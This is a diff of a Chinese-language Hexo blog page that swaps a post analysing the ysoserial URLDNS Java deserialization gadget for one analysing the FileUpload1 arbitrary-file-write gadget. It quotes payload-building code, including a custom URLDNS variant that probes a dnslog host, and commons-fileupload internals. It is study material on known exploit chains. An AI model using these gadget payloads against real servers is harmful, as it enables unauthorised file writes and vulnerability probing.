@@ -6,31 +6,37 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>ysoserial学习之URLDNS | Hexo</title>
+  <title>ysoserial学习之FileUpload | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="前言URLDNS这个gadgets得主要做用为dns外联到dnslog中，在dnslog中得到回显以此来判断目标是否存在漏洞。下面分析一下这条链得原理。">
+  <meta name="description" content="前言FileUpload1 实验环境:jdk1.8.0_211、commons-fileupload:commons-fileupload:1.3.1、commons-io:commons-io:2.4">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ysoserial学习之URLDNS">
-<meta property="og:url" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS/index.html">
+<meta property="og:title" content="ysoserial学习之FileUpload">
+<meta property="og:url" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="前言URLDNS这个gadgets得主要做用为dns外联到dnslog中，在dnslog中得到回显以此来判断目标是否存在漏洞。下面分析一下这条链得原理。">
+<meta property="og:description" content="前言FileUpload1 实验环境:jdk1.8.0_211、commons-fileupload:commons-fileupload:1.3.1、commons-io:commons-io:2.4">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS/2020-09-22-01-1619854967388.png">
-<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS/2020-09-22-02-1619854967389.png">
-<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS/2020-09-22-03-1619854967389.png">
-<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS/2020-09-22-04-1619854967389.png">
-<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS/2020-09-22-05-1619854967389.png">
-<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS/2020-09-22-06-1619854967389.png">
-<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS/2020-09-22-07-1619854967389.png">
-<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS/2020-09-22-08-1619854967389.png">
-<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS/2020-09-22-09-1619854967389.png">
-<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS/2020-09-22-10-1619854967389.png">
-<meta property="article:published_time" content="2021-05-01T05:33:16.000Z">
-<meta property="article:modified_time" content="2021-05-01T07:43:29.193Z">
+<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/image-20201026182711996.png">
+<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/image-20201026182849586.png">
+<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/image-20201026184638801.png">
+<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/image-20201026185045890.png">
+<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/image-20201026185214521.png">
+<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/image-20201026185455292.png">
+<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/image-20201026185719505.png">
+<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/image-20201026190001368.png">
+<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/image-20201026185929689.png">
+<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/image-20201026190523271.png">
+<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/image-20201026190643850.png">
+<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/image-20201026190510805.png">
+<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/image-20201026214745867.png">
+<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/image-20201026220809430.png">
+<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/image-20201026220944312.png">
+<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/image-20201026221055943.png">
+<meta property="article:published_time" content="2021-05-01T07:46:02.000Z">
+<meta property="article:modified_time" content="2021-05-01T07:47:45.531Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="ysoserial学习">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS/2020-09-22-01-1619854967388.png">
+<meta name="twitter:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/image-20201026182711996.png">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -166,73 +172,88 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-ysoserial学习之URLDNS" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-ysoserial学习之FileUpload" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      ysoserial学习之URLDNS
+      ysoserial学习之FileUpload
     </h1>
   
 
         
-        <a href="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS/" class="archive-article-date">
-  	<time datetime="2021-05-01T05:33:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-01</time>
+        <a href="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/" class="archive-article-date">
+  	<time datetime="2021-05-01T07:46:02.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-01</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>URLDNS这个gadgets得主要做用为dns外联到dnslog中，在dnslog中得到回显以此来判断目标是否存在漏洞。下面分析一下这条链得原理。</p>
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>FileUpload1</p>
+<p>实验环境:jdk1.8.0_211、commons-fileupload:commons-fileupload:1.3.1、commons-io:commons-io:2.4</p>
 <span id="more"></span>
 
-<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">public class URLDNS implements ObjectPayload&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">        public Object getObject(final String url) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">                &#x2F;&#x2F;Avoid DNS resolution during payload creation</span><br><span class="line">                &#x2F;&#x2F;Since the field &lt;code&gt;java.net.URL.handler&lt;&#x2F;code&gt; is transient, it will not be part of the serialized payload.</span><br><span class="line">                URLStreamHandler handler &#x3D; new SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">                HashMap ht &#x3D; new HashMap(); &#x2F;&#x2F; HashMap that will contain the URL</span><br><span class="line">                URL u &#x3D; new URL(null, url, handler); &#x2F;&#x2F; URL to use as the Key</span><br><span class="line">                ht.put(u, url); &#x2F;&#x2F;The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, &quot;hashCode&quot;, -1); &#x2F;&#x2F; During the put above, the URL&#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span><br><span class="line"></span><br><span class="line">                return ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public static void main(final String[] args) throws Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;**</span><br><span class="line">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span><br><span class="line">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span><br><span class="line">         * using the serialized object.&lt;&#x2F;p&gt;</span><br><span class="line">         *</span><br><span class="line">         * &lt;b&gt;Potential false negative:&lt;&#x2F;b&gt;</span><br><span class="line">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span><br><span class="line">         * second resolution.&lt;&#x2F;p&gt;</span><br><span class="line">         *&#x2F;</span><br><span class="line">        static class SilentURLStreamHandler extends URLStreamHandler &#123;</span><br><span class="line"></span><br><span class="line">                protected URLConnection openConnection(URL u) throws IOException &#123;</span><br><span class="line">                        return null;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                protected synchronized InetAddress getHostAddress(URL u) &#123;</span><br><span class="line">                        return null;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><h4 id="WRITE"><a href="#WRITE" class="headerlink" title="WRITE"></a>WRITE</h4><p>首先看官方给的参数提示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">* Arguments:</span><br><span class="line"> * - copyAndDelete;sourceFile;destDir</span><br><span class="line"> * - write;destDir;ascii-data</span><br><span class="line"> * - writeB64;destDir;base64-data</span><br><span class="line"> * - writeOld;destFile;ascii-data</span><br><span class="line"> * - writeOldB64;destFile;base64-data</span><br></pre></td></tr></table></figure>
 
-<p>先给出利用链</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Gadget Chain:</span><br><span class="line">*     HashMap.readObject()</span><br><span class="line">*       HashMap.putVal()</span><br><span class="line">*         HashMap.hash()</span><br><span class="line">*           URL.hashCode()</span><br></pre></td></tr></table></figure>
+<p>然后看代码，我们首先分析- write;destDir;ascii-data这套参数，其对应如下图所示的代码</p>
+<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/image-20201026182711996.png"></p>
+<p>跟入</p>
+<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/image-20201026182849586.png"></p>
+<p>看到提示，写入数据到xxx.tmp中，跟入makePayload方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">File repository &#x3D; new File(repoPath);</span><br><span class="line">        DiskFileItem diskFileItem &#x3D; new DiskFileItem(&quot;test&quot;, &quot;application&#x2F;octet-stream&quot;, false, &quot;test&quot;, 100000, repository);      &#x2F;&#x2F;创建了一个DiskFileItem类</span><br><span class="line">        </span><br><span class="line">File outputFile &#x3D; new File(filePath);</span><br><span class="line">        DeferredFileOutputStream dfos &#x3D; new DeferredFileOutputStream(thresh, outputFile);   &#x2F;&#x2F;创建了一个参数为thresh&#x3D;data.length+1和outputFile的类</span><br><span class="line"> </span><br><span class="line">OutputStream os &#x3D; (OutputStream) Reflections.getFieldValue(dfos, &quot;memoryOutputStream&quot;);</span><br><span class="line">        os.write(data);      &#x2F;&#x2F;获取DeferredFileOutputStream实体类的memoryOutputStream参数，并写入data数据</span><br><span class="line">        </span><br><span class="line">Reflections.getField(ThresholdingOutputStream.class, &quot;written&quot;).set(dfos, data.length);   &#x2F;&#x2F;将DeferredFileOutputStream实体类的written字段设置为data.length</span><br><span class="line"> </span><br><span class="line">Reflections.setFieldValue(diskFileItem, &quot;dfos&quot;, dfos);</span><br><span class="line">        Reflections.setFieldValue(diskFileItem, &quot;sizeThreshold&quot;, 0);      &#x2F;&#x2F;将diskFileItem的dfos设置为之前创建的DeferredFileOutputStream实体类，sizeThreshold字段设置为0</span><br><span class="line"> </span><br><span class="line"> return diskFileItem</span><br></pre></td></tr></table></figure>
 
-<p>然后首先看URLDNS类得getObject方法，该方法获取一个url返回一个对象，该对象进行序列化再反序列化后就会触发dns解析。该对象是HashMap类型得，因此我们可以查看该类得readObject或者readResolve之类得方法。从利用链中可以看到我们需要跟进得方法是readObject方法。</p>
-<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS/2020-09-22-01-1619854967388.png"></p>
-<p>可以看到readObject中把map中得key和value分别反序列化还原了其值，然后对key执行了hash方法。跟入hash方法。</p>
-<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS/2020-09-22-02-1619854967389.png">可以看到该方法在key为空时返回0，key不为空时执行(h = key.hashCode()) ^ (h &gt;&gt;&gt; 16)</p>
-<p>在跟入key得hashCode方法前我们首先需要确认一件事，就是key是哪一个类得对象。翻看ysoserial.payloads.URLDNS的代码我们发现hashmap中得key是URL类的对象。因此我们就进入URL类的hashCode方法中。</p>
-<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS/2020-09-22-03-1619854967389.png"></p>
-<p>该方法首先校验了hashcode是否为-1，不是-1直接返回，是-1继续。我们这里是希望继续下去得，而看到类中对hashcode属性得定义是private int，没有加transient，因此是可以序列化得，所以我们可以在序列化之前把hashcode内容设置为-1，这样反序列后就能取到hashcode为-1。</p>
-<p>接下的问题就是确定handle的值是什么，我们查看URL类中的handle属性，发现handle被定义为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">transient URLStreamHandler handler;</span><br></pre></td></tr></table></figure>
+<p>上面就是exp中关于- write;destDir;ascii-data参数的全过程</p>
+<p>下面看一下触发点，不过在看触发之前，由于该类重写了writeObject，所以我们先看一下该类的writeObject</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">private void writeObject(ObjectOutputStream out) throws IOException &#123;</span><br><span class="line">       if (this.dfos.isInMemory()) &#123;         </span><br><span class="line">           this.cachedContent &#x3D; this.get();</span><br><span class="line">       &#125; else &#123;</span><br><span class="line">           this.cachedContent &#x3D; null;</span><br><span class="line">           this.dfosFile &#x3D; this.dfos.getFile();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       out.defaultWriteObject();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
 
-<p>这说明了handle的值不可被序列化，在反序列化后handle的值应当为null。这样岂不是空指针了？其实不然，仔细观察我们发现了URL类中存在一个readResolve方法。动态调试一番之后发现readResolve其实就是调用了一个new URL(null,url,null)。</p>
-<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS/2020-09-22-04-1619854967389.png">与我们之前类实例化相比较一下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new URL(null,url,null)      &#x2F;&#x2F;反序列化readResolve</span><br><span class="line">URL u &#x3D; new URL(null, url, handler)    &#x2F;&#x2F;getObject代码中的实例化</span><br></pre></td></tr></table></figure>
+<p>this.dfos.isInMemory() 这个函数跟进入后发现其含义为,如果this.written字段&lt;=this.threshold的话,执行this.cachedContent = this.get(),由于this.threshold在exp中被我们设置为了data.length+1，this.written被设置为了data.length，所以表达式恒成立，结果必然进入到this.cachedContent = this.get()中。</p>
+<p>接下来看下this.get()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">public byte[] get() &#123;</span><br><span class="line">      if (this.isInMemory()) &#123;      &#x2F;&#x2F;这里和之前那个逻辑差不多，也永远为真</span><br><span class="line">          if (this.cachedContent &#x3D;&#x3D; null) &#123;</span><br><span class="line">              this.cachedContent &#x3D; this.dfos.getData();</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          return this.cachedContent;              &#x2F;&#x2F;这之上的代码为重要的</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">          byte[] fileData &#x3D; new byte[(int)this.getSize()];</span><br><span class="line">          BufferedInputStream fis &#x3D; null;</span><br><span class="line"></span><br><span class="line">          try &#123;</span><br><span class="line">              fis &#x3D; new BufferedInputStream(new FileInputStream(this.dfos.getFile()));</span><br><span class="line">              fis.read(fileData);</span><br><span class="line">          &#125; catch (IOException var12) &#123;</span><br><span class="line">              fileData &#x3D; null;</span><br><span class="line">          &#125; finally &#123;</span><br><span class="line">              if (fis !&#x3D; null) &#123;</span><br><span class="line">                  try &#123;</span><br><span class="line">                      fis.close();</span><br><span class="line">                  &#125; catch (IOException var11) &#123;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          return fileData;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
 
-<p>两者相比就是handle刚开始的值为空了，那么我们接着调试，看最后handle的值是多少。</p>
-<p>在构造方法中一直前进到599行，这里终于要开始获取handle的对象了</p>
-<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS/2020-09-22-05-1619854967389.png"></p>
-<p>跟入方法中</p>
-<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS/2020-09-22-06-1619854967389.png">handlers是一个hashtable，从中去出了我们http对应的handle对象，然后向上转型给URLStreamHandler类。接下来handle!=null因此直接return。ok，到这里为止理清楚了handle的值到底是什么，继续之前的handler.hashCode(this)。</p>
-<p>此时的handle是URLStreamHandler类的实例，直接去看URLStreamHandler的hashCode(URL)方法。</p>
-<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS/2020-09-22-07-1619854967389.png"></p>
-<p>进入getHostAddress方法</p>
-<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS/2020-09-22-08-1619854967389.png"></p>
-<p>两个箭头，一个是获取我们的host也就是dnslog的网址。另外一个是对host进行解析，到此出发dnslog。</p>
-<p>到这里结束了？不，还未结束！！！作者的代码我们真的理解清楚了吗？如果真的理解清楚了，请尝试回答下面几个问题。</p>
-<p><strong>问题1：</strong>请问作者为什么会在代码中给出如下代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">static class SilentURLStreamHandler extends URLStreamHandler &#123;</span><br><span class="line"></span><br><span class="line">                protected URLConnection openConnection(URL u) throws IOException &#123;</span><br><span class="line">                        return null;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                protected synchronized InetAddress getHostAddress(URL u) &#123;</span><br><span class="line">                        return null;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>接下来看this.dfos.getData()的内容</p>
+<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/image-20201026184638801.png"></p>
+<p>由于exp中我们已经memoryOutputStream里面写入了东西，所以这里调用到this.memoryOutputStream.toByteArray()。最后层层返回，this.cachedContent里面的内容就是this.memoryOutputStream.toByteArray()也就是我们参数中输入的ascii-data。</p>
+<p>看完了writeObject接下来就是readObject的触发点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">       in.defaultReadObject();</span><br><span class="line">       OutputStream output &#x3D; this.getOutputStream();</span><br><span class="line">       if (this.cachedContent !&#x3D; null) &#123;</span><br><span class="line">           output.write(this.cachedContent);</span><br><span class="line">       &#125; else &#123;</span><br><span class="line">           FileInputStream input &#x3D; new FileInputStream(this.dfosFile);</span><br><span class="line">           IOUtils.copy(input, output);</span><br><span class="line">           this.dfosFile.delete();</span><br><span class="line">           this.dfosFile &#x3D; null;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       output.close();</span><br><span class="line">       this.cachedContent &#x3D; null;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
 
-<p>这个问题很好理解，因为URLStreamHandler是一个抽象函数，我们不能直接实例化作为参数赋给URL类，所以我们写了一个类SilentURLStreamHandler继承了URLStreamHandler。而这里我们自己写的类不用担心在目标机器不存在而反序列化不了的问题，因为前面分析过handle是不能被反序列化的，其值是在反序列化过程中被重新赋予的。</p>
-<p>这个问题解决完后还有另外一个问题。</p>
-<p><strong>问题2：</strong>URLStreamHandler抽象类的抽象函数只有openConnection，那么我只需要重写openConnection就行了，为什么还要重写getHostAddress(URL u)这个方法？</p>
-<p>解决这个问题，我们还是先看代码。</p>
-<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS/2020-09-22-09-1619854967389.png">这里URL类作为hashmap的key是被put进去的，跟进看put方法，发现存在 hash(key) 这段代码，这段代码正是我们反序列化中触发点。所以dns解析会在put这里直接提前触发，而作者重写的handle在执行解析函数getHostAddress(URL u)是直接return了null。那么在put时就不会提前解析了。</p>
-<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS/2020-09-22-10-1619854967389.png"></p>
-<p><strong>附加题：</strong></p>
-<p>还能怎么绕过hashmap put时触发问题？下面是我的绕过代码，至于为什么，解析了这么多，大家伙自己体会吧~~</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">package ysoserial;</span><br><span class="line"></span><br><span class="line">import ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.net.*;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line"></span><br><span class="line">public class URLDNS &#123;</span><br><span class="line">    public static void main(String args[]) throws Exception &#123;</span><br><span class="line">        URLStreamHandler urlStreamHandler&#x3D;new place();</span><br><span class="line">        URL u&#x3D;new URL(null,&quot;http:&#x2F;&#x2F;gqkljp.dnslog.cn&quot;,urlStreamHandler);</span><br><span class="line">        HashMap map&#x3D;new HashMap();</span><br><span class="line">        Reflections.setFieldValue(u, &quot;hashCode&quot;, 10086);</span><br><span class="line">        map.put(u,&quot;1&quot;);</span><br><span class="line">        Reflections.setFieldValue(u, &quot;hashCode&quot;, -1);</span><br><span class="line">        ObjectOutputStream oos&#x3D;new ObjectOutputStream(new FileOutputStream(new File(&quot;out.bin&quot;)));</span><br><span class="line">        oos.writeObject(map);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois&#x3D;new ObjectInputStream(new FileInputStream(new File(&quot;out.bin&quot;)));</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    static class place extends URLStreamHandler &#123;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        protected URLConnection openConnection(URL u) throws IOException &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>还是一步步看，首先是in.defaultReadObject()，调用默认的readObject，对类的状态进行还原。</p>
+<p>然后调用this.getOutputStream()，这里看下其代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public OutputStream getOutputStream() throws IOException &#123;</span><br><span class="line">       if (this.dfos &#x3D;&#x3D; null) &#123;</span><br><span class="line">           File outputFile &#x3D; this.getTempFile();</span><br><span class="line">           this.dfos &#x3D; new DeferredFileOutputStream(this.sizeThreshold, outputFile);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       return this.dfos;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
 
